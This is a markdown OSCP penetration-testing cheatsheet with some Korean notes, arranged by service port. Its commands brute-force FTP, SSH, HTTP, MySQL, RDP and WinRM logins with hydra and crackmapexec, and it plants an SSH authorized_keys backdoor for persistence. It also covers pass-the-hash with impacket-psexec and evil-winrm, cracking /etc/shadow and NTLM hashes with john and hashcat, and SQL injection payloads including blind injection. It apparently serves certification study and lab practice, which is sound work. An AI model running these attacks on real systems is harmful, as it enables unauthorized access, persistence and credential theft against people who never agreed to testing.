# OSCP Cheatsheet

* [Enumeration](#Enumeration)
* [FTP - 21](#ftp---21)
* [SSH - 22](#ssh---22)
  * [Brute force](#brute-force)
  * [SSH backdoor - post exploitation](#ssh-backdoor---post-exploitation)
* [HTTP, HTTPS - 80, 443](#http-https---80-443)
* [SNMP - 161](#snmp---161)
* [NFS - 2049](#NFS---2049)
* [SMB - 445](#smb---445)
* [MySQL - 3306](#mysql---3306)
* [RDP - 3389](#rdp---3389)
* [WINRM - 5985 - 5986](#WINRM---5985---5986)
* [Fuzzing](#Fuzzing)
* [Password crack](#password-crack)
  * [John](#john)
  * [Hashcat](#hashcat)
* [SQL Injection](#SQL-Injection)
  * [Examining the database](#examining-the-database)
  * [Error based SQL Injection](#error-based-sql-injection)
  * [Filter bypass](#filter-bypass)
* [Dumb Shell to Fully Interactive Shell](#dumb-shell-to-fully-interactive-shell)

# Enumeration

## Nmap Initial scan

~~~ bash
nmap -sCV -Pn $target --open --min-rate 3000 -oA output
~~~

# FTP - 21

## Brute force

~~~ bash
hydra -V -f -L users.txt -P passwords.txt ftp://target.com -u -vV
~~~


## Anonymous access

~~~ bash
ftp $ip
ftp> USER anonymous
ftp> PASS anonymous
~~~


# SSH - 22

## Brute force

~~~ bash
hydra -V -f -L users.txt -P passwords.txt ssh://target.com -u -vV
~~~

## SSH backdoor - post exploitation

~~~ bash
# Attacker
ssh-keygen -f <FILENAME>
chmod 600 <FILENAME>
cat <FILENAME>.pub -> copy

# Victim
echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys

# Connect
ssh -i <FILENAME> <USER>@<IP>
~~~


# HTTP, HTTPS - 80, 443

## Brute force(hydra)

``` bash
hydra -L users.txt -P passwords.txt target.com -s 8081 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid" -V
```

## Brute force(wpscan)

```bash
wpscan --url http://target.com:8081 --passwords pass.txt
```


# SNMP - 161

## snmpbulkwalk

~~~
1.3.6.1.2.1.25.1.6.0 : 시스템 프로세스
1.3.6.1.2.1.25.4.2.1.2 : 프로그램 실행
1.3.6.1.2.1.25.4.2.1.4 : 프로세스 경로
1.3.6.1.2.1.25.2.3.1.4 : 보관 유닛
1.3.6.1.2.1.25.6.3.1.2 : 소프트웨어 이름
1.3.6.1.4.1.77.1.2.25 : 사용자 계정
1.3.6.1.2.1.6.13.1.3 : TCP 로컬 포트
~~~

~~~ bash
snmpbulkwalk -c public -v2c $target
~~~

~~~ bash
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25
~~~



# NFS - 2049

## Show Mountable NFS Shares

~~~ bash
showmount -e <IP>
nmap --script=nfs-showmount -oN mountable_shares <IP>
~~~

## Mount a share

~~~ bash
sudo mount -v -t nfs <IP>:<SHARE> /mnt/test
~~~

## Nmap script scan

~~~ bash
sudo nmap -p 111,2049 -Pn -n --open -sV --script="nfs-*" <IP>
~~~


# SMB - 445

## Get share files list

~~~ bash
smbclient -N -L <IP>
~~~

```-N``` --no-pass

```-L``` --list=HOST

## Connection
~~~ bash
smbclient -N \\\\{IP}\\backups
~~~

## PsExec

### 전제 조건
- 타겟 호스트의 Local Administrator 권한을 갖고 있는 계정/비밀번호
- 타겟 호스트가 SMB 서비스를 사용하고 있으며 방화벽으로 막아놓지 않는 경우
- File and Print Sharing 활성화, Simple File Sharing 비활성화 (디폴트)

[https://www.xn--hy1b43d247a.com/lateral-movement/smb-psexec](https://www.xn--hy1b43d247a.com/lateral-movement/smb-psexec)

~~~ bash
impacket-psexec Administrator:'Password123!'@<RHOST>
impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
~~~


# MySQL - 3306

## Nmap script scan

~~~ bash
sudo nmap -p 3306 -Pn -n --open -sV -sC --script="mysql-*" <IP>
~~~


## Brute force

~~~ bash
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
~~~

## Dumping

~~~ bash
mysqldump -u root -p 'password' -P 3389 -h hostname dbname tablename > mysqldump.sql
~~~


# RDP - 3389

## Connection

~~~ bash
xfreerdp /u:Administrator /p:'Password123!' /v:<IP> /dynamic-resolution
~~~


## Brute force

~~~ bash
hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
hydra -f -l admin -p 1q2w3e4r rdp://<IP> -u -vV
~~~

# WINRM - 5985 - 5986

## Brute force

~~~ bash
crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
~~~

## Connecting

~~~ bash
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
evil-winrm -i <IP> -u <USER> -H <HASH>
~~~

## Interactive

~~~ bash
*Evil-WinRM* PS C:\Users\support\Desktop> upload <filename>
*Evil-WinRM* PS C:\Users\support\Desktop> download <filename>
~~~


# Fuzzing

## FFUF path fuzzing

~~~ bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ
~~~

## FUFF subdomain fuzzing

~~~ bash
ffuf -u http://target.com/ -w ./fuzzDicts/subdomainDicts/main.txt -H "Host:FUZZ.target.com" -mc 200
~~~




# Password crack

## John

### Basically

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-MD5 --pot=john.output
~~~


### cracking htpasswd using mask

~~~ bash
john htpasswd -1=[0-9a-z] --mask='G4HeulB?1' --max-length=11
~~~

### cracking /etc/shadow

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
~~~

## Hashcat

### MD5 cracking

~~~ bash
hashcat -m 0 "412dd4759978acfcc81deab01b382403" /usr/share/wordlists/rockyou.txt.gz --show
hashcat -m 0 hashfile.txt /usr/share/wordlists/rockyou.txt.gz --show
~~~

```--show``` 옵션을 붙일 경우 이전에 나왔던 결과를 출력하고 크래킹 작업은 생략

### Linux password cracking

~~~ bash
hashcat -m 1800 -a 0 hash.txt rockyou.txt
~~~


### Windows password cracking

~~~ bash
hashcat -m 1000 -a 0 hash.txt rockyou.txt
~~~


# SQL Injection

reference: [https://pentestmonkey.net/category/cheat-sheet/sql-injection](https://pentestmonkey.net/category/cheat-sheet/sql-injection)

## Examining the database

~~~ sql
-- MySQL
UNION SELECT TABLE_NAME,TABLE_SCHEMA FROM information_schema.tables WHERE TABLE_SCHEMA = 0x64767761# 0x64767761 = 'dvwa'
UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 0x7573657273# 0x7573657273 = 'users'
UNION SELECT USER, PASSWORD FROM USERS#

-- blind sql injection
if((select count(*) from information_schema.tables where table_schema='{DBNAME}') = 1, 1, 0) # check exist dbname
LENGTH((select table_name from information_schema.tables where table_schema='{DBNAME}'))={i} # examining dbname length
SUBSTRING((select table_name from information_schema.tables where table_schema='{DBNAME}'),{i},1)='{word}' # examining table name
~~~

reference: [https://portswigger.net/web-security/sql-injection/examining-the-database](https://portswigger.net/web-security/sql-injection/examining-the-database)

## Error Based SQL Injection

~~~ sql
-- MSSQL
if (@@VERSION)=9 select 1 else select 2;
~~~

## Filter bypass

Quote bypass: [https://www.rapidtables.com/convert/number/ascii-to-hex.html](https://www.rapidtables.com/convert/number/ascii-to-hex.html)

reference: [https://portswigger.net/support/sql-injection-bypassing-common-filters](https://portswigger.net/support/sql-injection-bypassing-common-filters)


# Dumb Shell to Fully Interactive Shell

``` bash
script /dev/null -c bash
# Ctrl + z
stty -raw echo; fg
# Enter (Return) x2
reset
xterm-256color
```
